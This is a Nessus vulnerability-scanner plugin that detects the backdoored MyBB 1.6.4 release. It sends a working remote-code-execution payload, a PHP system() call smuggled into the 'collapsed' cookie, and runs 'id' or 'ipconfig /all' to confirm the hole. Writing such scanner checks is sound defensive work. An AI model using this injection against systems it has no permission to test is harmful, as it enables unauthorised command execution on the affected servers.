#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(56512);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/05/22 19:48:53 $");

  script_bugtraq_id(49993);
  script_osvdb_id(76111);
  script_xref(name:"EDB-ID", value:"17949");
  script_xref(name:"Secunia", value:"46300");

  script_name(english:"MyBB 1.6.4 Backdoor PHP Remote Code Execution");
  script_summary(english:"Attempts to execute PHP code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is affected by
a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"A version of MyBB 1.6.4 with a backdoor was detected on the remote
host. The MyBB source code repository was compromised, and backdoor
code was added to allow arbitrary PHP execution. The backdoor is
present in MyBB 1.6.4 downloaded on or before October 6, 2011. A
remote, unauthenticated attacker can exploit this to execute arbitrary
PHP code on the affected host, subject to the privileges under which
the web server runs.");
  script_set_attribute(attribute:"see_also", value:"http://blog.mybb.com/2011/10/06/1-6-4-security-vulnerabilit/");
  script_set_attribute(attribute:"see_also", value:"http://blog.mybb.com/wp-content/uploads/2011/10/mybb_1604_patches.txt");
  script_set_attribute(attribute:"solution", value:
"Install the latest version of MyBB 1.6.4. Alternatively, apply the
patch referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"MyBB 1.6.4 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'myBB 1.6.4 Backdoor Arbitrary Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/10/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/10/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/10/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mybb:mybb");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "installed_sw/MyBB");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "MyBB";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# make an educated guess about which command to run,
# unless paranoid or unable to fingerprint the OS
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask|IP(v(4|6)?)? Address";

url = dir + '/index.php';
enable_cookiejar();
vuln = FALSE;

foreach cmd (cmds)
{
  php = urlencode(str:'system("' + cmd + '");');
  clear_cookiejar();
  set_http_cookie(name:'collapsed', value:'0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|' + php);
  res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

rest = strstr(res[2], '<!DOCTYPE');
if (!empty_or_null(rest)) output = res[2] - rest;
else output = res[2];

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : 2,
  request     : make_list(http_last_sent_request()),
  output      : chomp(output)
);
exit(0);
